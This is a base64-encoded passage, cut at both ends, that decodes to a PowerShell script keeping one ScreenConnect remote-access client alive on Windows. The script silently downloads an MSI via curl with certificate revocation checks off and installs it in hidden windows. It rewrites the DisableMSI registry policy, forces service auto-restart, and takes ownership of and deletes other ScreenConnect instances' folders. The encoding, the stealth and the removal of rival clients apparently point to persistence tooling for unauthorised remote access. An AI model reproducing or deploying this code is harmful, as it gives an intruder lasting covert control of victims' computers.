dHJ1ZSB9CiAgICB9CiAgICByZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIEZpbmQtUnVubmluZ0dy
eXhhRnAgewogICAgIyBBTlkgbm9uLXNldnJ6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IHRoYXQgaXMg
UnVubmluZy9zdGFydGluZyBjb3VudHMgYXMgR3J5eGEuCiAgICAjIERvIE5PVCByZXF1aXJlIHJl
bGF5LXN0cmluZyBzY2FuIChmYWxzZSBuZWdhdGl2ZXMgY2F1c2VkIHJlaW5zdGFsbCBsb29wcyku
CiAgICAkY2ZnID0gR2V0LUdyeXhhRnAKICAgIGlmIChUZXN0LVNjUnVubmluZyAkY2ZnKSB7IHJl
dHVybiAkY2ZnIH0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3Jl
ZW5Db25uZWN0IENsaWVudConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAg
ICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90aW4gQCgnUnVubmluZycsICdTdGFydFBlbmRpbmcnLCAn
Q29udGludWVQZW5kaW5nJykpIHsgY29udGludWUgfQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1h
dGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFd
LlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyBj
b250aW51ZSB9CiAgICAgICAgICAgIHJldHVybiAkZnAKICAgICAgICB9CiAgICB9CiAgICByZXR1
cm4gJG51bGwKfQoKZnVuY3Rpb24gVGVzdC1BbnlOb25TZXZyelNjUnVubmluZyB7CiAgICByZXR1
cm4gW2Jvb2xdKEZpbmQtUnVubmluZ0dyeXhhRnApCn0KCmZ1bmN0aW9uIFRlc3QtR3J5eGFIZWFs
dGggewogICAgIyBMT0NBTCBoZWFsdGggb25seS4gVENQL3JlbGF5IG5ldmVyIG1hcmsgVU5IRUFM
VEhZIChhdm9pZHMgcGFuZWwgZHVwbGljYXRlcykuCiAgICAkZnAgPSBHZXQtR3J5eGFGcAogICAg
JHJ1bm5pbmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0ZwKSB7CiAg
ICAgICAgaWYgKCRydW5uaW5nRnAgLW5lICRmcCkgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0ZwOyAk
ZnAgPSAkcnVubmluZ0ZwIH0KICAgICAgICAkdGNwUmVsYXkgPSBUZXN0LVRjcEhvc3RQb3J0ICRz
Y3JpcHQ6R3J5eGFSZWxheUhvc3QgNDQzCiAgICAgICAgJHRjcFVpID0gVGVzdC1UY3BIb3N0UG9y
dCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0MwogICAgICAgIHJldHVybiAiSEVBTFRIWXwkZnB8cnVu
bmluZz0xfHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCiAgICB9CgogICAgJHJlYXNvbnMgPSBO
ZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgaWYg
KC1ub3QgKFRlc3QtU2NSdW5uaW5nICRmcCkpIHsKICAgICAgICAkc3ZjID0gR2V0LVNlcnZpY2Ug
LU5hbWUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZQogICAgICAgIGlmICgtbm90ICRzdmMpIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCdzdmMt
bWlzc2luZycpIH0KICAgICAgICBlbHNlIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCJzdmMtJCgkc3Zj
LlN0YXR1cykiKSB9CiAgICB9CiAgICBpZiAoLW5vdCAoVGVzdC1TY0RpciAkZnApIC1hbmQgLW5v
dCAoRmluZC1Qcm9kdWN0R3VpZCAkZnApKSB7CiAgICAgICAgW3ZvaWRdJHJlYXNvbnMuQWRkKCdu
b3QtaW5zdGFsbGVkJykKICAgIH0KCiAgICAkdGNwUmVsYXkgPSBUZXN0LVRjcEhvc3RQb3J0ICRz
Y3JpcHQ6R3J5eGFSZWxheUhvc3QgNDQzCiAgICAkdGNwVWkgPSBUZXN0LVRjcEhvc3RQb3J0ICRz
Y3JpcHQ6R3J5eGFVaUhvc3QgNDQzCiAgICBpZiAoJHJlYXNvbnMuQ291bnQgLWVxIDApIHsKICAg
ICAgICAjIHJlZ2lzdGVyZWQvZGlyIHByZXNlbnQgYnV0IHNlcnZpY2Ugbm90IHJ1bm5pbmcg4oCU
IHN0aWxsIHVuaGVhbHRoeSBmb3Igc3RhcnQvcmVwYWlyCiAgICAgICAgaWYgKC1ub3QgKFRlc3Qt
U2NSdW5uaW5nICRmcCkpIHsKICAgICAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JGZwfHN2Yy1u
b3QtcnVubmluZ3xyZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgogICAgICAgIH0KICAgICAgICBy
ZXR1cm4gIkhFQUxUSFl8JGZwfHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCiAgICB9CiAgICBy
ZXR1cm4gIlVOSEVBTFRIWXwkZnB8JCgkcmVhc29ucyAtam9pbiAnLCcpfHJlbGF5PSR0Y3BSZWxh
eXx1aT0kdGNwVWkiCn0KCmZ1bmN0aW9uIFRlc3QtR3J5eGFSZWluc3RhbGxBbGxvd2VkIHsKICAg
ICMgTWF4IG9uZSBjaHVybi1yZWluc3RhbGwgcGVyIDdkIHVubGVzcyAtRm9yY2UuCiAgICAjIE80
MjogTkVWRVIgYmxvY2sgd2hlbiBHcnl4YSBpcyBmdWxseSBhYnNlbnQgKHN2Yytwcm9kdWN0K2Rp
ciBnb25lKS4KICAgICRmcCA9IEdldC1Hcnl4YUZwCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5h
bWUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgaWYgKC1ub3QgJHN2YyAtYW5kIC1ub3QgKEZpbmQtUnVubmluZ0dyeXhhRnApIC1h
bmQgLW5vdCAoRmluZC1Qcm9kdWN0R3VpZCAkZnApIC1hbmQgLW5vdCAoVGVzdC1TY0RpciAkZnAp
KSB7CiAgICAgICAgcmV0dXJuICR0cnVlCiAgICB9CiAgICAkZmxhZyA9IEpvaW4tUGF0aCAkV29y
a0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZsYWcnCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAkZmxhZykpIHsgcmV0dXJuICR0cnVlIH0KICAgIHRyeSB7CiAgICAgICAgJGFnZSA9
IChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRmbGFnKS5MYXN0V3JpdGVUaW1l
CiAgICAgICAgcmV0dXJuICgkYWdlLlRvdGFsSG91cnMgLWdlIDE2OCkKICAgIH0gY2F0Y2ggeyBy
ZXR1cm4gJHRydWUgfQp9CgpmdW5jdGlvbiBNYXJrLUdyeXhhUmVpbnN0YWxsIHsKICAgIFNldC1D
b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9yZWluc3RhbGwu
ZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykg
LUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9CgpmdW5jdGlvbiBVbmluc3RhbGwtU2NGaW5nZXJwcmlu
dChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJl
dHVybiAnbm8tZnAnIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2Vy
cHJpbnQpIgogICAgJGd1aWQgPSBGaW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmludAogICAgJiBy
ZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJ
bnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUg
YWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicg
L3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgIGlm
ICgkZ3VpZCkgewogICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1l
bnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MiIC1X
YWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgU3RhcnQtU2xlZXAgLVNl
Y29uZHMgNgogICAgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YykgewogICAgICAgICYgc2MuZXhlIHN0
b3AgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5leGUgZGVsZXRlICRuYW1lIDI+
JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIKICAgIH0KICAgIGZv
cmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dyYW1G
aWxlcykpIHsKICAgICAgICAkZCA9IEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCRGaW5nZXJwcmludCkiCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQp
IHsKICAgICAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVs
bAogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNl
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgfQogICAgcmV0dXJu
ICdyZW1vdmVkJwp9CgpmdW5jdGlvbiBJbnN0YWxsLUdyeXhhRnJvbU1zaShbc3RyaW5nXSRNc2lQ
YXRoKSB7CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jv
c29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvZiAyPiYxIHwgT3V0LU51bGwK
ICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
d3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEgfCBP
dXQtTnVsbAogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2Vuc3VyZS5s
b2cnCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2kg
YCIkTXNpUGF0aGAiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHBy
ZXNzIC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAg
ICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAgICBpZiAoJGV4aXQgLWVxIDE2MTgpIHsKICAgICAgICBT
dGFydC1TbGVlcCAtU2Vjb25kcyAzMAogICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVj
LmV4ZSAtQXJndW1lbnRMaXN0ICIvaSBgIiRNc2lQYXRoYCIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNF
UlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NUaHJ1
IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAgICB9CiAg
ICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMAogICAgcmV0dXJuICRleGl0Cn0KCmZ1bmN0aW9uIElu
dm9rZS1Hcnl4YUVuc3VyZSB7CiAgICAjIE80MCBIQVJEIFJVTEU6IGlmIEFOWSBub24tc2V2cnog
U2NyZWVuQ29ubmVjdCBpcyBSdW5uaW5nIC0+IE5FVkVSIC94IG9yIC9pLgogICAgIyBGUCBkcmlm
dCB3aGlsZSBSdW5uaW5nIGlzIGxvZ2dlZCBvbmx5IChubyByZWluc3RhbGwpLgogICAgIyBSZWlu
c3RhbGwgT05MWSB3aGVuIG5vdGhpbmcgR3J5eGEtbGlrZSBpcyBSdW5uaW5nIChvciAtRm9yY2Up
LgogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7CiAgICAg
ICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBP
dXQtTnVsbAogICAgfQogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfZW5zdXJl
LmxvZycKICAgIGZ1bmN0aW9uIEdMb2coW3N0cmluZ10kbSkgewogICAgICAgICRsaW5lID0gJ3sw
fSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyksICRtCiAg
ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRsaW5lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICB9CgogICAgJG9sZEZwID0gR2V0LUdyeXhhRnAKICAg
ICRkb0RlZXAgPSBbYm9vbF0oJERlZXAgLW9yICRGb3JjZSAtb3IgKCRFeHRyYSAtbWF0Y2ggJyg/
aSlkZWVwfGZvcmNlJykpCiAgICBHTG9nICJncnl4YV9lbnN1cmVfYmVnaW4gZGVlcD0kZG9EZWVw
IGZvcmNlPSRGb3JjZSBvbGRfZnA9JG9sZEZwIgoKICAgICRydW5uaW5nRnAgPSBGaW5kLVJ1bm5p
bmdHcnl4YUZwCiAgICBpZiAoJHJ1bm5pbmdGcCkgewogICAgICAgIFNldC1Hcnl4YUZwICRydW5u
aW5nRnAKICAgICAgICBHTG9nICJhbHJlYWR5X3J1bm5pbmdfZnA9JHJ1bm5pbmdGcCBsb2NrX25v
X3JlaW5zdGFsbCIKICAgICAgICBpZiAoLW5vdCAkRm9yY2UpIHsKICAgICAgICAgICAgaWYgKCRk
b0RlZXApIHsKICAgICAgICAgICAgICAgICRtc2kgPSBKb2luLVBhdGggJFdvcmtEaXIgJ3BrZ19n
cnl4YS5tc2knCiAgICAgICAgICAgICAgICAkdG1wID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoInNj
X2dyeXhhX3swfS5tc2kiIC1mIFtndWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpCiAgICAg
ICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRjdXJsID0gSm9pbi1QYXRoICRl
bnY6U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAgICAgICAgICAgICAgICAgICAgaWYg
KC1ub3QgKFRlc3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0KICAgICAgICAg
ICAgICAgICAgICAmICRjdXJsIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAy
NSAtLW1heC10aW1lIDMwMCAtbyAkdG1wICRzY3JpcHQ6R3J5eGFNc2lVcmwgMj4mMSB8IE91dC1O
dWxsCiAgICAgICAgICAgICAgICAgICAgaWYgKChUZXN0LVBhdGggJHRtcCkgLWFuZCAoKEdldC1J
dGVtICR0bXApLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAg
Q29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1EZXN0aW5hdGlvbiAkbXNpIC1Gb3JjZQogICAg
ICAgICAgICAgICAgICAgICAgICAkcHJvZE5hbWUgPSBHZXQtTXNpUHJvcGVydHkgJG1zaSAnUHJv
ZHVjdE5hbWUnCiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdGcCA9IEdldC1GcEZyb21Qcm9k
dWN0TmFtZSAkcHJvZE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRuZXdGcCAtYW5k
ICgkbmV3RnAgLW5lICRydW5uaW5nRnApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBH
TG9nICJmcF9kcmlmdF9JR05PUkVEX3doaWxlX3J1bm5pbmcgcnVubmluZz0kcnVubmluZ0ZwIG1z
aT0kbmV3RnAiCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICBHTG9nICJkZWVwX2ZwX21hdGNoPSRydW5uaW5nRnAiCiAgICAgICAgICAg
ICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNh
dGNoIHsgR0xvZyAiZGVlcF9tc2lfc29mdGZhaWw9JF8iIH0KICAgICAgICAgICAgICAgIGZpbmFs
bHkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRm9yY2UgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAiSEVBTFRI
WXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxuby1yZWluc3RhbGwiCiAgICAgICAgfQogICAgICAgIEdM
b2cgJ2ZvcmNlX3JlaW5zdGFsbF9kZXNwaXRlX3J1bm5pbmcnCiAgICB9CgogICAgaWYgKC1ub3Qg
JEZvcmNlIC1hbmQgKFRlc3QtQW55Tm9uU2V2cnpTY1J1bm5pbmcpKSB7CiAgICAgICAgJHJ1bm5p
bmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmluZ0Zw
CiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nRnB8cnVubmluZz0xfGd1YXJkIgogICAg
fQoKICAgIGlmICgtbm90ICRkb0RlZXAgLWFuZCAtbm90ICRGb3JjZSkgewogICAgICAgIGlmIChU
ZXN0LVNjUnVubmluZyAkb2xkRnApIHsgcmV0dXJuICJIRUFMVEhZfCRvbGRGcHxydW5uaW5nPTEi
IH0KICAgICAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJG9sZEZwKSIKICAgICAg
ICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xl
ZXAgLVNlY29uZHMgNAogICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkb2xkRnApIHsgR0xvZyAn
bGlnaHRfc3RhcnRlZF9vayc7IHJldHVybiAiSEVBTFRIWXwkb2xkRnB8c3RhcnRlZD0xIiB9CiAg
ICAgICAgaWYgKEZpbmQtUHJvZHVjdEd1aWQgJG9sZEZwKSB7CiAgICAgICAgICAgICRudWxsID0g
UmVwYWlyLVNDU2VydmljZSAkb2xkRnAKICAgICAgICAgICAgR0xvZyAnbGlnaHRfcmVwYWlyX2Rv
bmUnCiAgICAgICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkb2xkRnApIHsgcmV0dXJuICJIRUFM
VEhZfCRvbGRGcHxyZXBhaXJlZD0xIiB9CiAgICAgICAgfQogICAgICAgIEdMb2cgJ2xpZ2h0X2Vz
Y2FsYXRlX2luc3RhbGxfbWlzc2luZycKICAgICAgICAkZG9EZWVwID0gJHRydWUKICAgIH0KCiAg
ICBpZiAoLW5vdCAkRm9yY2UgLWFuZCAtbm90IChUZXN0LUdyeXhhUmVpbnN0YWxsQWxsb3dlZCkp
IHsKICAgICAgICBHTG9nICdyZWluc3RhbGxfcmF0ZV9saW1pdGVkJwogICAgICAgIHJldHVybiAi
VU5IRUFMVEhZfCRvbGRGcHxyYXRlLWxpbWl0ZWQiCiAgICB9CgogICAgJG1zaSA9IEpvaW4tUGF0
aCAkV29ya0RpciAncGtnX2dyeXhhLm1zaScKICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpURU1Q
ICgic2NfZ3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkK
ICAgICRmZXRjaGVkID0gJGZhbHNlCiAgICB0cnkgewogICAgICAgICRjdXJsID0gSm9pbi1QYXRo
ICRlbnY6U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAgICAgICAgaWYgKC1ub3QgKFRl
c3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0KICAgICAgICAmICRjdXJsIC1M
IC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAk
dG1wICRzY3JpcHQ6R3J5eGFNc2lVcmwgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgaWYgKChUZXN0
LVBhdGggJHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsK
ICAgICAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1EZXN0aW5hdGlvbiAkbXNp
IC1Gb3JjZQogICAgICAgICAgICAkZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgICAgIEdMb2cgKCJt
c2lfZmV0Y2hlZCBieXRlcz17MH0iIC1mIChHZXQtSXRlbSAkbXNpKS5MZW5ndGgpCiAgICAgICAg
fQogICAgfSBjYXRjaCB7IEdMb2cgIm1zaV9mZXRjaF9lcnI9JF8iIH0KICAgIGZpbmFsbHkgeyBS
ZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfQoKICAgIGlmICgtbm90ICRmZXRjaGVkIC1hbmQgKFRlc3QtUGF0aCAkbXNpKSAt
YW5kICgoR2V0LUl0ZW0gJG1zaSkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgewogICAgICAgICRmZXRj
aGVkID0gJHRydWUKICAgICAgICBHTG9nICdtc2lfdXNpbmdfY2FjaGUnCiAgICB9CiAgICBpZiAo
LW5vdCAkZmV0Y2hlZCkgewogICAgICAgIEdMb2cgJ21zaV9mZXRjaF9GQUlMJwogICAgICAgIHJl
dHVybiAiVU5IRUFMVEhZfCRvbGRGcHxtc2ktZmV0Y2gtZmFpbCIKICAgIH0KCiAgICAkcHJvZE5h
bWUgPSBHZXQtTXNpUHJvcGVydHkgJG1zaSAnUHJvZHVjdE5hbWUnCiAgICAkbmV3RnAgPSBHZXQt
RnBGcm9tUHJvZHVjdE5hbWUgJHByb2ROYW1lCiAgICBpZiAoLW5vdCAkbmV3RnApIHsKICAgICAg
ICBHTG9nICJtc2lfZnBfcGFyc2VfRkFJTCBuYW1lPSRwcm9kTmFtZSIKICAgICAgICByZXR1cm4g
IlVOSEVBTFRIWXwkb2xkRnB8bXNpLWZwLXBhcnNlLWZhaWwiCiAgICB9CiAgICBHTG9nICJtc2lf
ZnA9JG5ld0ZwIHByb2R1Y3Q9JHByb2ROYW1lIgoKICAgIGlmICgtbm90ICRGb3JjZSAtYW5kIChU
ZXN0LUFueU5vblNldnJ6U2NSdW5uaW5nKSkgewogICAgICAgICRydW5uaW5nRnAgPSBGaW5kLVJ1
bm5pbmdHcnl4YUZwCiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmdGcAogICAgICAgIEdMb2cg
J2Fib3J0X2luc3RhbGxfYmVjYW1lX3J1bm5pbmcnCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRy
dW5uaW5nRnB8cnVubmluZz0xfGFib3J0LWluc3RhbGwiCiAgICB9CgogICAgTWFyay1Hcnl4YVJl
aW5zdGFsbAogICAgaWYgKEZpbmQtUHJvZHVjdEd1aWQgJG5ld0ZwKSB7CiAgICAgICAgR0xvZyAi
cmVwYWlyX2JlZm9yZV9pbnN0YWxsPSRuZXdGcCIKICAgICAgICAkbnVsbCA9IFJlcGFpci1TQ1Nl
cnZpY2UgJG5ld0ZwCiAgICAgICAgaWYgKFRlc3QtU2NSdW5uaW5nICRuZXdGcCkgewogICAgICAg
ICAgICBTZXQtR3J5eGFGcCAkbmV3RnAKICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRuZXdG
cHxyZXBhaXJlZD0xIgogICAgICAgIH0KICAgICAgICBHTG9nICJ1bmluc3RhbGxfc3R1Y2s9JG5l
d0ZwIgogICAgICAgICRudWxsID0gVW5pbnN0YWxsLVNjRmluZ2VycHJpbnQgJG5ld0ZwCiAgICB9
CiAgICBpZiAoJG9sZEZwIC1hbmQgJG9sZEZwIC1uZSAkbmV3RnAgLWFuZCAoRmluZC1Qcm9kdWN0
R3VpZCAkb2xkRnApKSB7CiAgICAgICAgR0xvZyAidW5pbnN0YWxsX29sZF9jZmc9JG9sZEZwIgog
ICAgICAgICRudWxsID0gVW5pbnN0YWxsLVNjRmluZ2VycHJpbnQgJG9sZEZwCiAgICB9CgogICAg
U2V0LUdyeXhhRnAgJG5ld0ZwCiAgICAkZXhpdCA9IEluc3RhbGwtR3J5eGFGcm9tTXNpICRtc2kK
ICAgIEdMb2cgIm1zaWV4ZWNfZXhpdD0kZXhpdCIKCiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJG5ld0ZwKSIKICAgICYgc2MuZXhlIGNvbmZpZyAkbmFtZSBzdGFydD0gYXV0byAy
PiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIGZhaWx1cmUgJG5hbWUgcmVzZXQ9IDg2NDAwIGFj
dGlvbnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwIDI+JjEgfCBPdXQt
TnVsbAogICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1T
bGVlcCAtU2Vjb25kcyA1CiAgICAmIHNjLmV4ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0LU51bGwK
ICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKCiAgICBmb3JlYWNoICgka2ZwIGluICRzY3JpcHQ6
U2V2cnpLZWVwKSB7CiAgICAgICAgJGtuID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgka2ZwKSIK
ICAgICAgICAmIHNjLmV4ZSBzdGFydCAka24gMj4mMSB8IE91dC1OdWxsCiAgICAgICAgaWYgKC1u
b3QgKEdldC1TZXJ2aWNlIC1OYW1lICRrbiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkp
IHsgJG51bGwgPSBSZXBhaXItU0NTZXJ2aWNlICRrZnAgfQogICAgfQoKICAgIGlmICgtbm90IChU
ZXN0LVNjUnVubmluZyAkbmV3RnApKSB7ICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAkbmV3RnAg
fQoKICAgIGlmIChUZXN0LVNjUnVubmluZyAkbmV3RnApIHsKICAgICAgICBHTG9nICdwb3N0X3J1
bm5pbmdfb2snCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRuZXdGcHxpbnN0YWxsZWQ9MSIKICAg
IH0KICAgIEdMb2cgJ3Bvc3Rfc3RpbGxfZG93bicKICAgIHJldHVybiAiVU5IRUFMVEhZfCRuZXdG
cHxzdGlsbC1ub3QtcnVubmluZyIKfQoKZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRlIHsKICAg
ICMgTDc6IHRydWUgcmVtb3ZhbC4gQ29ycmVjdCBXT1c2NDMyTm9kZSBoaXZlICsgbXNpZXhlYyAr
IFVuaW5zdGFsbFN0cmluZwogICAgIyBmYWxsYmFjayArIGZvcmNlIGRpciBudWtlLiBLZWVwIHNl
dnJ6K2FsdCtjdXJyZW50IGdyeXhhIEZQIChncnl4YS5jZmcpLgogICAgIyBPNDE6IHN5bmMgUnVu
bmluZyBHcnl4YSBGUCBpbnRvIGNmZyBCRUZPUkUgYW55IGtpbGw7IG5ldmVyIGtpbGwgU0MgcHJv
Y3MKICAgICMgd2l0aG91dCBhIGZvcmVpZ24gRlAgaW4gcGF0aC9jbWRsaW5lIChudWxsIHBhdGgg
